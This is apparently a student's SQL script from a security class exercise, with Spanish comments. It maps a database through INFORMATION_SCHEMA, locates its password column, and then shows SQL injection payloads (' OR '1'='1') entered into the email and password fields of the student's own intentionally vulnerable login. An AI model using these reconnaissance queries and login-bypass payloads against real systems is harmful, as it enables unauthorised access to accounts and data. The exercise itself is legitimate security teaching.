-- JUAN CARLOS DÍAZ DEL CASTILLO

--  ********** 1. Pruebas con INFORMATION_SCHEMA *************
-- PRUEBA 1. Obtener todas las bases de datos
use information_schema;

SELECT schema_name
FROM schemata;

-- Prueba 2: Obtención de las tablas de la bd preguntadaw
use information_schema;

SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'preguntadaw';

-- PRUEBA 3: Obtener las columnas de la tabla usuarios de la bd preguntadaw
use information_schema;
SELECT column_name
FROM columns
WHERE table_schema = “preguntadaw”
AND table_name = “usuarios”;


-- PRUEBA 4: Localizar la columna contraseña en la bd Preguntadaw

use information_schema;
SELECT table_name, column_name
FROM columns
WHERE table_schema = "preguntadaw"
AND column_name LIKE "contrasenia";


-- -----------------------------------------------------------------------


/***** 3. Pruebas de SQL INYECTION: Ataques de login: 
Usando el inicio de sesión de la tarea TAR-11.01 (El punto 1-Inicio de sesión vulnerable) **********/

/*cabe recalcar que cada vez que iniciamos sesión se ejecutan dos procesos: buscarEmail() y biuscarPaswword(). Esto lo hice, porque en el momento de realizar la 
tarea quería visualizar un mensaje personalizado, es decir, contraseña incorrecta(en el caso de que la contraseña no sea la correcta) o usuario incorrecto
(en el caso de que el email no sea correcto). Se que no es lo idóneo por seguridad, pero en su momento quise hacerlo para comprobar que me distinguiera bien 
ambos procesos y que en el caso de fallar uno, que no entrara en el siguiente.*/

--3.1 Introducimos inyección de SQL en el input correo.
SELECT * FROM usuario
WHERE correo = 'a@b.com' OR '1'='1'

--3.2 Inyección de SQL en el input de email e introducir una password existente.

-- Primera consulta: buscarEmail
SELECT * FROM usuario
WHERE correo = 'a@b.com' OR '1'='1'


--Segunda consulta: buscarPassword
SELECT * FROM usuario
WHERE correo = 'a@b.com' OR '1'='1'
AND pw = '1234JuanCarlos'

--3.3. Introducir la misma inyección tanto en el input email como en el input password.

--Primera consulta (buscarEmail):
SELECT * FROM usuario
WHERE correo = 'a@b.com' OR '1'='1'

--Segunda Consulta (buscarPassword)
SELECT * FROM usuario
WHERE correo = 'a@b.com' OR '1'='1'
AND pw = 'a@b.com' OR '1'='1'

